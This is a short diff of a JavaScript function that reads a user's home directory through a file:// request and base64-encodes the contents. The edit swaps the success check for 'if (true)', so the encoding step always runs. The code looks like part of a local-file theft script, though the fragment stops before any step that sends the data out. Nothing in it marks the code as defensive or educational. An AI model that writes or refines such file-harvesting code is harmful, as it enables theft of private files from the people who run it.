@@ -13,7 +13,7 @@ function fetchAndProcess() {
     x.open("GET", "file:///home/OxBF/", false);
     x.onload = function() {
         // Check if the request was successful
-        if (x.status >= 200 && x.status < 300) {
+        if (true) {
             // Convert the responseText to Base64
             try {
                 var base64Encoded = btoa(unescape(encodeURIComponent(x.responseText)));
